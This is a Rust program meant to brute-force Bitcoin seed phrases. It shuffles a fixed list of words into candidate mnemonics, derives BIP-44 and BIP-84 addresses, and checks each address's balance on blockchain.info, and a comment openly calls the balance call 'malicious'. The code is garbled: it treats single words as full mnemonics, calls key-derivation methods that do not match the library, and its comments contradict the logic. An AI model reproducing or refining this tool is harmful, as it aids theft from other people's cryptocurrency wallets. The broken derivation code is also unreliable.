use bitcoin::{Address, Network, util::bip32::{ExtendedPrivKey, ExtendedPubKey}};
use rand::seq::SliceRandom;

struct WalletGenerator {
    mnemonics_list: Vec<String>,
}

impl WalletGenerator {
    fn new(mnemonics_list: Vec<String>) -> Self {
        WalletGenerator { mnemonics_list }
    }

    fn shuffle_words(&mut self, times: usize) {
        for _ in 0..times {
            self.mnemonics_list.shuffle(&mut rand::thread_rng());
        }
    }

    fn generate_wallet_address(&self) -> Vec<(String, String)> {
        let mut addresses = Vec::new();

        for mnemonics in self.mnemonics_list.iter().take(12) {
            // BIP-44 derivation for BTC
            let bip32_root_key = ExtendedPrivKey::from_mnemonic(mnemonics).unwrap();
            let bip44_account_key = bip32_root_key.derive_priv_cn(44 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0).unwrap()
                .derive_priv_cn(0).unwrap();
            let address_bip44 = Address::p2pkh(&bip44_account_key.public_key(Network::Bitcoin).to_pubkeyhash(), Network::Bitcoin).to_string();

            // BIP-84 derivation for BTC
            let bip84_account_key = bip32_root_key.derive_priv_cn(84 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0 | ExtendedPrivKey::HARDENED_KEY).unwrap()
                .derive_priv_cn(0).unwrap()
                .derive_priv_cn(0).unwrap();
            let address_bip84 = Address::p2wpkh(&bip84_account_key.public_key(Network::Bitcoin).to_pubkeyhash(), Network::Bitcoin).to_string();

            addresses.push((address_bip44, address_bip84));
        }

        addresses
    }

    fn check_balance_on_blockchain(&self, wallet_address: &str) -> serde_json::Value {
        // Insert your malicious blockchain API call here
        let response = reqwest::blocking::get(&format!("https://blockchain.info/rawaddr/{}", wallet_address))
            .expect("Failed to get balance from blockchain");
        response.json().expect("Failed to parse JSON response")
    }
}

fn main() {
    // Your list of words
    let mut word_list = vec![
        "moon", "tower", "food", "hope", "number", "that", "will", "two", "day", "find", 
        "this", "seed", "phrase", "picture", "subject", "only",
        "real", "black", "brave", "world"
    ];

    // Create 1000 shuffled mnemonics
    let mut shuffled_mnemonics = word_list.clone();
    shuffled_mnemonics.shuffle(&mut rand::thread_rng());

    // Create 12 shuffled mnemonics
    let shuffled_mnemonics_12: Vec<String> = shuffled_mnemonics.into_iter().take(12).collect();

    // Create instance of WalletGenerator
    let mut wallet_generator_instance = WalletGenerator::new(shuffled_mnemonics_12);

    // Shuffle words 1000 times
    wallet_generator_instance.shuffle_words(1000);

    // Execution
    let addresses = wallet_generator_instance.generate_wallet_address();

    for (i, (address_bip44, address_bip84)) in addresses.into_iter().enumerate() {
        println!("Address {}:", i + 1);
        println!("Wallet Address (BIP44): {}, Balance Confirmation: {:?}", address_bip44, wallet_generator_instance.check_balance_on_blockchain(&address_bip44));
        println!("Wallet Address (BIP84): {}, Balance Confirmation: {:?}", address_bip84, wallet_generator_instance.check_balance_on_blockchain(&address_bip84));
        println!();
    }
}
